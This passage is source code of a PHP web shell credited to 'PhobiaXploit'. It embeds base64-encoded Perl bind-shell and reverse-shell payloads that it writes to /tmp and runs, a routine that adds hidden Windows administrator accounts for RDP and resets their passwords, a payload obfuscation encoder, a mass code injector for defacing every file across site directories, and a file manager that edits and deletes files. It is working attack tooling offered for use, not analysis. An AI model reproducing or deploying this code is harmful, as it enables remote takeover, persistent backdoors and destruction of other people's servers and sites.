    <u>Back Connect:</u> <br>
    Server: <input type='text' placeholder='ip' name='ip_bc' value='".$_SERVER['REMOTE_ADDR']."'>&nbsp;&nbsp;
    PORT: <input type='text' placeholder='port' name='port_bc' value='6969'>
    <input type='submit' name='sub_bc' value='>>'>
    </form>";
    $bind_port_p="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
    if(isset($_POST['sub_bp'])) {
        $f_bp = fopen("/tmp/bp.pl", "w");
        fwrite($f_bp, base64_decode($bind_port_p));
        fclose($f_bp);

        $port = $_POST['port_bind'];
        $out = exe("perl /tmp/bp.pl $port 1>/dev/null 2>&1 &");
        sleep(1);
        echo "<pre>".$out."\n".exe("ps aux | grep bp.pl")."</pre>";
        unlink("/tmp/bp.pl");
    }
    $back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
    if(isset($_POST['sub_bc'])) {
        $f_bc = fopen("/tmp/bc.pl", "w");
        fwrite($f_bc, base64_decode($bind_connect_p));
        fclose($f_bc);

        $ipbc = $_POST['ip_bc'];
        $port = $_POST['port_bc'];
        $out = exe("perl /tmp/bc.pl $ipbc $port 1>/dev/null 2>&1 &");
        sleep(1);
        echo "<pre>".$out."\n".exe("ps aux | grep bc.pl")."</pre>";
        unlink("/tmp/bc.pl");
    }
} elseif($_GET['do'] == 'krdp_shell') {
    if(strtolower(substr(PHP_OS, 0, 3)) === 'win') {
        if($_POST['create']) {
            $user = htmlspecialchars($_POST['user']);
            $pass = htmlspecialchars($_POST['pass']);
            if(preg_match("/$user/", exe("net user"))) {
                echo "[INFO] -> <font color=red>user <font color=lime>$user</font> sudah ada</font>";
            } else {
                $add_user   = exe("net user $user $pass /add");
                $add_groups1 = exe("net localgroup Administrators $user /add");
                $add_groups2 = exe("net localgroup Administrator $user /add");
                $add_groups3 = exe("net localgroup Administrateur $user /add");
                echo "[ RDP ACCOUNT INFO ]<br>
                ------------------------------<br>
                IP: <font color=lime>".$ip."</font><br>
                Username: <font color=lime>$user</font><br>
                Password: <font color=lime>$pass</font><br>
                ------------------------------<br><br>
                [ STATUS ]<br>
                ------------------------------<br>
                ";
                if($add_user) {
                    echo "[add user] -> <font color='lime'>Berhasil</font><br>";
                } else {
                    echo "[add user] -> <font color='red'>Gagal</font><br>";
                }
                if($add_groups1) {
                    echo "[add localgroup Administrators] -> <font color='lime'>Berhasil</font><br>";
                } elseif($add_groups2) {
                    echo "[add localgroup Administrator] -> <font color='lime'>Berhasil</font><br>";
                } elseif($add_groups3) {
                    echo "[add localgroup Administrateur] -> <font color='lime'>Berhasil</font><br>";
                } else {
                    echo "[add localgroup] -> <font color='red'>Gagal</font><br>";
                }
                echo "------------------------------<br>";
            }
        } elseif($_POST['s_opsi']) {
            $user = htmlspecialchars($_POST['r_user']);
            if($_POST['opsi'] == '1') {
                $cek = exe("net user $user");
                echo "Checking username <font color=lime>$user</font> ....... ";
                if(preg_match("/$user/", $cek)) {
                    echo "[ <font color=lime>Sudah ada</font> ]<br>
                    ------------------------------<br><br>
                    <pre>$cek</pre>";
                } else {
                    echo "[ <font color=red>belum ada</font> ]";
                }
            } elseif($_POST['opsi'] == '2') {
                $cek = exe("net user $user PhobiaXploitt");
                if(preg_match("/$user/", exe("net user"))) {
                    echo "[change password: <font color=lime>PhobiaXploitt</font>] -> ";
                    if($cek) {
                        echo "<font color=lime>Berhasil</font>";
                    } else {
                        echo "<font color=red>Gagal</font>";
                    }
                } else {
                    echo "[INFO] -> <font color=red>user <font color=lime>$user</font> belum ada</font>";
                }
            } elseif($_POST['opsi'] == '3') {
                $cek = exe("net user $user /DELETE");
                if(preg_match("/$user/", exe("net user"))) {
                    echo "[remove user: <font color=lime>$user</font>] -> ";
                    if($cek) {
                        echo "<font color=lime>Berhasil</font>";
                    } else {
                        echo "<font color=red>Gagal</font>";
                    }
                } else {
                    echo "[INFO] -> <font color=red>user <font color=lime>$user</font> belum ada</font>";
                }
            } else {
                //
            }
        } else {
            echo "-- Create RDP --<br>
            <form method='post'>
            <input type='text' name='user' placeholder='username' value='phobiaxploit' required>
            <input type='text' name='pass' placeholder='password' value='PhobiaXploit' required>
            <input type='submit' name='create' value='>>'>
            </form>
            -- Option --<br>
            <form method='post'>
            <input type='text' name='r_user' placeholder='username' required>
            <select name='opsi'>
            <option value='1'>Cek Username</option>
            <option value='2'>Ubah Password</option>
            <option value='3'>Hapus Username</option>
            </select>
            <input type='submit' name='s_opsi' value='>>'>
            </form>
            ";
        }
    } else {
        echo "<font color=red>Fitur ini hanya dapat digunakan dalam Windows Server.</font>";
    }
} elseif($_GET['act'] == 'newfile') {
    if($_POST['new_save_file']) {
        $newfile = htmlspecialchars($_POST['newfile']);
        $fopen = fopen($newfile, "a+");
        if($fopen) {
            $act = "<script>window.location='?act=edit&dir=".$dir."&file=".$_POST['newfile']."';</script>";
        } else {
            $act = "<font color=red>permission denied</font>";
        }
    }
    echo $act;
    echo "<form method='post'>
    Filename: <input type='text' name='newfile' value='$dir/newfile.php' style='width: 450px;' height='10'>
    <input type='submit' name='new_save_file' value='Submit'>
    </form>";
} elseif($_GET['act'] == 'newfolder') {
    if($_POST['new_save_folder']) {
        $new_folder = $dir.'/'.htmlspecialchars($_POST['newfolder']);
        if(!mkdir($new_folder)) {
            $act = "<font color=red>permission denied</font>";
        } else {
            $act = "<script>window.location='?dir=".$dir."';</script>";
        }
    }
    echo $act;
    echo "<form method='post'>
    Folder Name: <input type='text' name='newfolder' style='width: 450px;' height='10'>
    <input type='submit' name='new_save_folder' value='Submit'>
    </form>";
} elseif($_GET['act'] == 'rename_dir') {
    if($_POST['dir_rename']) {
        $dir_rename = rename($dir, "".dirname($dir)."/".htmlspecialchars($_POST['fol_rename'])."");
        if($dir_rename) {
            $act = "<script>window.location='?dir=".dirname($dir)."';</script>";
        } else {
            $act = "<font color=red>permission denied</font>";
        }
    echo "".$act."<br>";
    }
    echo "<form method='post'>
    <input type='text' value='".basename($dir)."' name='fol_rename' style='width: 450px;' height='10'>
    <input type='submit' name='dir_rename' value='rename'>
    </form>";
} elseif($_GET['act'] == 'delete_dir') {
    if(is_dir($dir)) {
        if(is_writable($dir)) {
            @rmdir($dir);
            @exe("rm -rf $dir");
            @exe("rmdir /s /q $dir");
            $act = "<script>window.location='?dir=".dirname($dir)."';</script>";
        } else {
            $act = "<font color=red>could not remove ".basename($dir)."</font>";
        }
    }
    echo $act;
} elseif($_GET['act'] == 'view') {
    echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'><b>view</b></a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
    echo "<textarea readonly>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea>";
} elseif($_GET['act'] == 'edit') {
    if($_POST['save']) {
        $save = file_put_contents($_GET['file'], $_POST['src']);
        if($save) {
            $act = "<font color=lime>Saved!</font>";
        } else {
            $act = "<font color=red>permission denied</font>";
        }
    echo "".$act."<br>";
    }
    echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'><b>edit</b></a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
    echo "<form method='post'>
    <textarea name='src'>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea><br>
    <input type='submit' value='Save' name='save' style='width: 500px;'>
    </form>";
} elseif($_GET['act'] == 'rename') {
    if($_POST['do_rename']) {
        $rename = rename($_GET['file'], "$dir/".htmlspecialchars($_POST['rename'])."");
        if($rename) {
            $act = "<script>window.location='?dir=".$dir."';</script>";
        } else {
            $act = "<font color=red>permission denied</font>";
        }
    echo "".$act."<br>";
    }
    echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'><b>rename</b></a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
    echo "<form method='post'>
    <input type='text' value='".basename($_GET['file'])."' name='rename' style='width: 450px;' height='10'>
    <input type='submit' name='do_rename' value='rename'>
    </form>";
    } elseif($_GET['do'] == 'string') {
$text = $_POST['code'];
?><center><br><b>-=[ S c r i p t E n d c o d e]=-</b><br>
<form method="post"><br><br><br>
<textarea class='inputz' cols=80 rows=10 name="code"></textarea><br><br>
<select class='inputz' size="1" name="ope">
<option value="urlencode">url</option>
<option value="base64">Base64</option>
<option value="ur">convert_uu</option>
<option value="gzinflates">gzinflate - base64</option>
<option value="jancok">str_rot13 - base64_dcode</option>
<option value="gzinflate">str_rot13 - gzinflate - base64</option>
<option value="str">str_rot13 - gzinflate - str_rot13 - base64</option>
<option value="Pelo">gzinflate - str_rot13 - base64_decode</option>
<option value="url">base64 - gzinflate - str_rot13 - convert_uu - gzinflate - base64</option>
</select>&nbsp;<input class='inputzbut' type='submit' name='submit' value='Encode'>
</form>

<?php
    $submit = $_POST['submit'];
    if (isset($submit)) {
        $op = $_POST["ope"];
        switch ($op) {
            case 'base64':
                $codi = base64_encode($text);
            break;
            case 'str':
                $codi = (base64_encode(str_rot13(gzdeflate(str_rot13($text)))));
            break;
            case 'gzinflate':
                $codi = base64_encode(gzdeflate(str_rot13($text)));
            break;
            case 'jancok':
                $codi = base64_encode(str_rot13($text));
            break;
            case 'gzinflates':
                $codi = base64_encode(gzdeflate($text));
            break;
            case 'str2':
                $codi = base64_encode(str_rot13($text));
            break;
            case 'urlencode':
                $codi = rawurlencode($text);
            break;
            case 'Pelo':
                $codi = base64_encode(str_rot13(gzdeflate($text)));
            break;
            case 'ur':
                $codi = convert_uuencode($text);
            break;
            case 'url':
                $codi = base64_encode(gzdeflate(convert_uuencode(str_rot13(gzdeflate(base64_encode($text))))));
            break;
            default:
            break;
        }
    }
    echo '<textarea cols=80 rows=10 class="inputz" readonly>' . $codi . '</textarea></center><BR><BR>';
}
elseif($_GET['do'] == 'code') {
echo '<center><h1>Mass Code Injector</h1></center>';
    echo '<div class="content">';

    if(stristr(php_uname(),"Windows")) { $DS = "\\"; } else if(stristr(php_uname(),"Linux")) { $DS = '/'; }
    function get_structure($path,$depth) {
        global $DS;
        $res = array();
        if(in_array(0, $depth)) { $res[] = $path; }
        if(in_array(1, $depth) or in_array(2, $depth) or in_array(3, $depth)) {
            $tmp1 = glob($path.$DS.'*',GLOB_ONLYDIR);
            if(in_array(1, $depth)) { $res = array_merge($res,$tmp1); }
        }
        if(in_array(2, $depth) or in_array(3, $depth)) {
            $tmp2 = array();
            foreach($tmp1 as $t){
                $tp2 = glob($t.$DS.'*',GLOB_ONLYDIR);
                $tmp2 = array_merge($tmp2, $tp2);
            }
            if(in_array(2, $depth)) { $res = array_merge($res,$tmp2); }
        }
        if(in_array(3, $depth)) {
            $tmp3 = array();
            foreach($tmp2 as $t){
                $tp3 = glob($t.$DS.'*',GLOB_ONLYDIR);
                $tmp3 = array_merge($tmp3, $tp3);
            }
            $res = array_merge($res,$tmp3);
        }
        return $res;
    }

    if(isset($_POST['submit']) && $_POST['submit']=='Inject') {
        $name = $_POST['name'] ? $_POST['name'] : '*';
        $type = $_POST['type'] ? $_POST['type'] : 'html';
        $path = $_POST['path'] ? $_POST['path'] : getcwd();
        $code = $_POST['code'] ? $_POST['code'] : 'Pakistan Haxors Crew';
        $mode = $_POST['mode'] ? $_POST['mode'] : 'a';
        $depth = sizeof($_POST['depth']) ? $_POST['depth'] : array('0');
        $dt = get_structure($path,$depth);
        foreach ($dt as $d) {
            if($mode == 'a') {
                if(file_put_contents($d.$DS.$name.'.'.$type, $code, FILE_APPEND)) {
                    echo '<div><strong>'.$d.$DS.$name.'.'.$type.'</strong><span style="color:lime;"> was injected</span></div>';
                } else {
                    echo '<div><span style="color:red;">failed to inject</span> <strong>'.$d.$DS.$name.'.'.$type.'</strong></div>';
                }
            } else {
                if(file_put_contents($d.$DS.$name.'.'.$type, $code)) {
                    echo '<div><strong>'.$d.$DS.$name.'.'.$type.'</strong><span style="color:lime;"> was injected</span></div>';
                } else {
                    echo '<div><span style="color:red;">failed to inject</span> <strong>'.$d.$DS.$name.'.'.$type.'</strong></div>';
                }
            }
        }
    } else {
        echo '<form method="post" action="">
                <table align="center">
                    <tr>
                        <td>Directory : </td>
                        <td><input class="box" name="path" value="'.getcwd().'" size="50"/></td>
                    </tr>
                    <tr>
                        <td class="title">Mode : </td>
                        <td>
                            <select style="width: 100px;" name="mode" class="box">
                                <option value="a">Apender</option>
                                <option value="w">Overwriter</option>
                            </select>
                        </td>
                    </tr>
                    <tr>
                        <td class="title">File Name & Type : </td>
                        <td>
                            <input type="text" style="width: 100px;" name="name" value="*"/>&nbsp;&nbsp;
                            <select style="width: 100px;" name="type" class="box">
                            <option value="html">HTML</option>
                            <option value="htm">HTM</option>
                            <option value="php" selected="selected">PHP</option>
                            <option value="asp">ASP</option>
                            <option value="aspx">ASPX</option>
                            <option value="xml">XML</option>
                            <option value="txt">TXT</option>
                        </select></td>
                    </tr>
                    <tr>
                        <td class="title">Code Inject Depth : </td>
                        <td>
                            <input type="checkbox" name="depth[]" value="0" checked="checked"/>&nbsp;0&nbsp;&nbsp;
                            <input type="checkbox" name="depth[]" value="1"/>&nbsp;1&nbsp;&nbsp;
                            <input type="checkbox" name="depth[]" value="2"/>&nbsp;2&nbsp;&nbsp;
                            <input type="checkbox" name="depth[]" value="3"/>&nbsp;3
                        </td>
                    </tr>
                    <tr>
                        <td colspan="2"><textarea name="code" cols="70" rows="10" class="box"></textarea></td>
                    </tr>
                    <tr>
                        <td colspan="2" style="text-align: center;">
                            <input type="hidden" name="a" value="Injector">
                            <input type="hidden" name="c" value="'.htmlspecialchars($GLOBALS['cwd']).'">
                            <input type="hidden" name="p1">
                            <input type="hidden" name="p2">
                            <input type="hidden" name="charset" value="'.(isset($_POST['charset'])?$_POST['charset']:'').'">
                            <input style="padding :5px; width:100px;" name="submit" type="submit" value="Inject"/></td>
                    </tr>
                </table>
        </form>';
    }
    echo '</div>';

} elseif($_GET['act'] == 'delete') {
    $delete = unlink($_GET['file']);
    if($delete) {
        $act = "<script>window.location='?dir=".$dir."';</script>";
    } else {
        $act = "<font color=red>permission denied</font>";
    }
    echo $act;
} else {
    if(is_dir($dir) === true) {
        if(!is_readable($dir)) {
            echo "<font color=red>can't open directory. ( not readable )</font>";
        } else {
            echo '<table width="100%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">
            <tr>
            <th class="th_home"><center>Name</center></th>
            <th class="th_home"><center>Type</center></th>
            <th class="th_home"><center>Size</center></th>
            <th class="th_home"><center>Last Modified</center></th>
            <th class="th_home"><center>Owner/Group</center></th>
            <th class="th_home"><center>Permission</center></th>
            <th class="th_home"><center>Action</center></th>
            </tr>';
            $scandir = scandir($dir);
            foreach($scandir as $dirx) {
                $dtype = filetype("$dir/$dirx");
                $dtime = date("F d Y g:i:s", filemtime("$dir/$dirx"));
                if(function_exists('posix_getpwuid')) {
                    $downer = @posix_getpwuid(fileowner("$dir/$dirx"));
                    $downer = $downer['name'];
                } else {
                    //$downer = $uid;
                    $downer = fileowner("$dir/$dirx");
                }
                if(function_exists('posix_getgrgid')) {
                    $dgrp = @posix_getgrgid(filegroup("$dir/$dirx"));
                    $dgrp = $dgrp['name'];
                } else {
                    $dgrp = filegroup("$dir/$dirx");
                }
                if(!is_dir("$dir/$dirx")) continue;
                if($dirx === '..') {
                    $href = "<a href='?dir=".dirname($dir)."'>$dirx</a>";
                } elseif($dirx === '.') {
                    $href = "<a href='?dir=$dir'>$dirx</a>";
                } else {
                    $href = "<a href='?dir=$dir/$dirx'>$dirx</a>";
                }
                if($dirx === '.' || $dirx === '..') {
                    $act_dir = "<a href='?act=newfile&dir=$dir'>newfile</a> | <a href='?act=newfolder&dir=$dir'>newfolder</a>";
                    } else {
                    $act_dir = "<a href='?act=rename_dir&dir=$dir/$dirx'>rename</a> | <a href='?act=delete_dir&dir=$dir/$dirx'>delete</a>";
                }
                echo "<tr>";
                echo "<td class='td_home'><img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA"."AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp"."/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='>$href</td>";
                echo "<td class='td_home'><center>$dtype</center></td>";
                echo "<td class='td_home'><center>-</center></th></td>";
                echo "<td class='td_home'><center>$dtime</center></td>";
                echo "<td class='td_home'><center>$downer/$dgrp</center></td>";
                echo "<td class='td_home'><center>".w("$dir/$dirx",perms("$dir/$dirx"))."</center></td>";
                echo "<td class='td_home' style='padding-left: 15px;'>$act_dir</td>";
                echo "</tr>";
            }
        }
    } else {
        echo "<font color=red>can't open directory.</font>";
    }
        foreach($scandir as $file) {
            $ftype = filetype("$dir/$file");
            $ftime = date("F d Y g:i:s", filemtime("$dir/$file"));
            $size = filesize("$dir/$file")/1024;
            $size = round($size,3);
            if(function_exists('posix_getpwuid')) {
                $fowner = @posix_getpwuid(fileowner("$dir/$file"));
                $fowner = $fowner['name'];
            } else {
                //$downer = $uid;
                $fowner = fileowner("$dir/$file");
            }
            if(function_exists('posix_getgrgid')) {
                $fgrp = @posix_getgrgid(filegroup("$dir/$file"));
                $fgrp = $fgrp['name'];
            } else {
                $fgrp = filegroup("$dir/$file");
            }
            if($size > 1024) {
                $size = round($size/1024,2). 'MB';
            } else {
                $size = $size. 'KB';
            }
            if(!is_file("$dir/$file")) continue;
            echo "<tr>";
            echo "<td class='td_home'><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII='><a href='?act=view&dir=$dir&file=$dir/$file'>$file</a></td>";
            echo "<td class='td_home'><center>$ftype</center></td>";
            echo "<td class='td_home'><center>$size</center></td>";
            echo "<td class='td_home'><center>$ftime</center></td>";
            echo "<td class='td_home'><center>$fowner/$fgrp</center></td>";
            echo "<td class='td_home'><center>".w("$dir/$file",perms("$dir/$file"))."</center></td>";
            echo "<td class='td_home' style='padding-left: 15px;'><a href='?act=edit&dir=$dir&file=$dir/$file'>edit</a> | <a href='?act=rename&dir=$dir&file=$dir/$file'>rename</a> | <a href='?act=delete&dir=$dir&file=$dir/$file'>delete</a> | <a href='?act=download&dir=$dir&file=$dir/$file'>download</a></td>";
            echo "</tr>";
        }
        echo "</table>";
        if(!is_readable($dir)) {
            //
        } else {
            echo "<hr><hr color=cyan>";
        }
    echo "<center><font color=white>Copyright</font><font color=lime> PhobiaXploit - 2018</font><br></center><center>";
}
?>
<script language="javascript">
var text='';
var delay=5;
var Xoff=0;
var Yoff=-30;
var txtw=10;
var beghtml='<font face="Iceland" color="white" size="5em">';
var endhtml='</font>';
ns4 = (navigator.appName.indexOf("Netscape")>=0 && document.layers)? true: false;
ie4 = (document.all && !document.getElementById)? true : false;
ie5 = (document.all && document.getElementById)? true : false;
ns6 = (document.getElementById && navigator.appName.indexOf("Netscape")>=0 )? true: false;
var txtA=new Array();
text=text.split('');
var x1=0;
var y1=-50;
var t='';
for(i=1;i<=text.length;i++){
t+=(ns4)? '<layer left="0" top="-100" width="'+txtw+'" name="txt'+i+'" height="1">' : '<div id="txt'+i+'" style="position:absolute; top:-100px; left:0px; height:1px; width:'+txtw+'; visibility:visible;">';
t+=beghtml+text[i-1]+endhtml;
t+=(ns4)? '</layer>' : '</div>';
}
document.write(t);
function moveid(id,x,y){
if(ns4)id.moveTo(x,y);
else{
id.style.left=x+'px';
id.style.top=y+'px';
}}
function animate(evt){
x1=Xoff+((ie4||ie5)?event.clientX+document.body.scrollLeft:evt.pageX);
y1=Yoff+((ie4||ie5)?event.clientY+document.body.scrollTop:evt.pageY);
}
function getidleft(id){
if(ns4)return id.left;
else return parseInt(id.style.left);
}
function getidtop(id){
if(ns4)return id.top;
else return parseInt(id.style.top);
}
function getwindowwidth(){
if(ie4||ie5)return document.body.clientWidth+document.body.scrollLeft;
else return window.innerWidth+pageXOffset;
}
function movetxts(){
for(i=text.length;i>1;i=i-1){
if(getidleft(txtA[i-1])+txtw*2>=getwindowwidth()){
moveid(txtA[i-1],0,-100);
moveid(txtA[i],0,-100);
}else moveid(txtA[i], getidleft(txtA[i-1])+txtw, getidtop(txtA[i-1]));
}
moveid(txtA[1],x1,y1);
}
window.onload=function(){
for(i=1;i<=text.length;i++)txtA[i]=(ns4)?document.layers['txt'+i]:(ie4)?document.all['txt'+i]:document.getElementById('txt'+i);
if(ns4)document.captureEvents(Event.MOUSEMOVE);
document.onmousemove=animate;
setInterval('movetxts()',delay);
}
</script>
</html>
